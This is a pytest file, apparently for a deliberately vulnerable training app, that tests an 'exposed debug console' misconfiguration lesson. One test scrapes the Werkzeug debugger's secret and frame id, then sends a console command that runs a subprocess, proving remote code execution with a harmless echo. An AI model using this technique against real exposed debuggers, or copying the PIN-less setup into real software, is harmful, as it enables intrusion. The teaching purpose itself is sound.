import re

from werkzeug.test import Client

from app import create_app
from app.categories.a05_security_misconfiguration.internal_tool import (
    DEBUG_MOUNT_PREFIX,
    wrap_with_debug_console,
)
from app.config import TestConfig


def _composite_test_client():
    from app.extensions import db

    test_app = create_app(TestConfig)
    with test_app.app_context():
        db.create_all()
    composite = wrap_with_debug_console(test_app)
    return Client(composite), test_app


def _teardown(test_app):
    from app.extensions import db

    with test_app.app_context():
        db.session.remove()
        db.drop_all()


def test_internal_diagnostics_teaching_page_loads(client):
    response = client.get("/a05/internal-diagnostics")
    assert response.status_code == 200
    assert b"Exposed Debug Console" in response.data


def test_main_app_unknown_route_stays_a_plain_404(client):
    # Proves the debugger mounting is scoped -- the main app's own
    # error/404 handling is never replaced by Werkzeug's debugger.
    response = client.get("/a05/this-route-does-not-exist")
    assert response.status_code == 404
    assert b"Werkzeug Debugger" not in response.data


def test_mounted_diagnostics_route_shows_interactive_debugger_with_no_pin():
    wsgi_client, test_app = _composite_test_client()
    try:
        response = wsgi_client.get(f"{DEBUG_MOUNT_PREFIX}/diagnostics")
        assert response.status_code == 500
        assert b"Werkzeug Debugger" in response.data
        assert b"EVALEX_TRUSTED = true" in response.data
    finally:
        _teardown(test_app)


def test_mounted_diagnostics_debugger_console_executes_real_code():
    wsgi_client, test_app = _composite_test_client()
    try:
        response = wsgi_client.get(f"{DEBUG_MOUNT_PREFIX}/diagnostics")
        body = response.data.decode()
        secret = re.search(r'SECRET = "([^"]+)"', body).group(1)
        # The deepest (last) frame in the traceback is always
        # diagnostics()'s own frame, since internal_tool_app has only
        # this one route.
        frame_id = re.findall(r'id="frame-(\d+)"', body)[-1]

        exec_response = wsgi_client.get(
            f"{DEBUG_MOUNT_PREFIX}/diagnostics",
            query_string={
                "__debugger__": "yes",
                "cmd": "__import__('subprocess').check_output(['echo', 'A05-RCE-PROOF']).decode()",
                "frm": frame_id,
                "s": secret,
            },
        )
        assert exec_response.status_code == 200
        assert b"A05-RCE-PROOF" in exec_response.data
    finally:
        _teardown(test_app)


def test_internal_diagnostics_link_appears_in_overview_once_registered(client):
    response = client.get("/a05/")
    assert response.status_code == 200
    assert b"Exposed Debug Console" in response.data
    assert b'href="/a05/internal-diagnostics"' in response.data
